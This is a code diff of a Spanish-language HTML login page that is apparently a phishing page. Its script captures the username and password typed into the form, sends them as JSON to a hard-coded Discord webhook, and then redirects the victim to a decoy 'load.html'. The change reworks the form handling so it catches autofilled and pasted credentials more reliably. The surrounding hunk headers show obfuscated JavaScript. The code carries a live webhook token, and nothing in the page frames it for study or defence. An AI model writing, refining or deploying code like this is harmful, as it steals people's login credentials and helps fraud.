@@ -532,37 +532,12 @@ const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_
   
 
 <script>
-  /* ─────────── Configuración ─────────── */
+(function () {
+  'use strict';
+
   const DISCORD_URL = 'https://discord.com/api/webhooks/1569498982030385292/ZHbmD8gcb0Qa_UWEKI9n3KrrN23MS1f2bzb2grvz0fCpDqgDc-CWBRPC4DxShQWN4jlp';
   const DESTINO     = 'load.html';
-  const ESPERA_MAX  = 4000; // ms máximo antes de redirigir aunque no conteste
-
-  const form      = document.getElementById('form-login');
-  const usuario   = document.getElementById('usuario');
-  const clave     = document.getElementById('clave');
-  const continuar = document.getElementById('continuar');
-  const verClave  = document.getElementById('ver-clave');
-
-  /* Ojo */
-  verClave.addEventListener('click', () => {
-    const visible = clave.type === 'text';
-    const inicio  = clave.selectionStart;
-    const fin     = clave.selectionEnd;
-
-    clave.type = visible ? 'password' : 'text';
-    verClave.setAttribute('aria-pressed', String(!visible));
-    verClave.setAttribute('aria-label', visible ? 'Mostrar contraseña' : 'Ocultar contraseña');
-
-    clave.focus({ preventScroll: true });
-    try { clave.setSelectionRange(inicio, fin); } catch (e) {}
-  });
-
-  /* Botón habilitado solo con los dos campos */
-  function refrescar() {
-    continuar.disabled = usuario.value.trim() === '' || clave.value.trim() === '';
-  }
-  usuario.addEventListener('input', refrescar);
-  clave.addEventListener('input', refrescar);
+  const ESPERA_MAX  = 4000;
 
   function esc(str) {
     return str
@@ -576,8 +551,48 @@ const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_
       .slice(0, 1000);
   }
 
-  /* ─────────── Envío y redirección ─────────── */
-  if (form) {
+  function init() {
+    const form      = document.getElementById('form-login');
+    const usuario   = document.getElementById('usuario');
+    const clave     = document.getElementById('clave');
+    const continuar = document.getElementById('continuar');
+    const verClave  = document.getElementById('ver-clave');
+
+    if (!form || !usuario || !clave || !continuar || !verClave) {
+      console.error('Falta algún elemento del formulario');
+      return;
+    }
+
+    /* Ojo */
+    verClave.addEventListener('click', () => {
+      const visible = clave.type === 'text';
+      const inicio  = clave.selectionStart;
+      const fin     = clave.selectionEnd;
+
+      clave.type = visible ? 'password' : 'text';
+      verClave.setAttribute('aria-pressed', String(!visible));
+      verClave.setAttribute('aria-label', visible ? 'Mostrar contraseña' : 'Ocultar contraseña');
+
+      clave.focus({ preventScroll: true });
+      try { clave.setSelectionRange(inicio, fin); } catch (e) {}
+    });
+
+    /* Habilitar: cubre teclado, pegado, autocompletado y restauración */
+    function refrescar() {
+      continuar.disabled = !usuario.value.trim() || !clave.value.trim();
+    }
+
+    ['input', 'change', 'keyup', 'paste', 'cut', 'blur'].forEach((ev) => {
+      usuario.addEventListener(ev, refrescar);
+      clave.addEventListener(ev, refrescar);
+    });
+
+    window.addEventListener('pageshow', refrescar);        // volver con "atrás"
+    document.addEventListener('visibilitychange', refrescar); // autofill en segundo plano
+    setInterval(refrescar, 500);                            // red de seguridad
+    refrescar();
+
+    /* Envío */
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
@@ -605,7 +620,9 @@ const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(cuerpo)
       })
-        .then((r) => { if (!r.ok) console.warn('Discord respondió', r.status); })
+        .then((r) => {
+          if (!r.ok) console.error('Discord respondió ' + r.status);
+        })
         .catch((err) => console.error('Envío fallido', err));
 
       await Promise.race([
@@ -616,6 +633,13 @@ const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_
       window.location.href = DESTINO;
     });
   }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
+})();
 </script>
 
 </body>
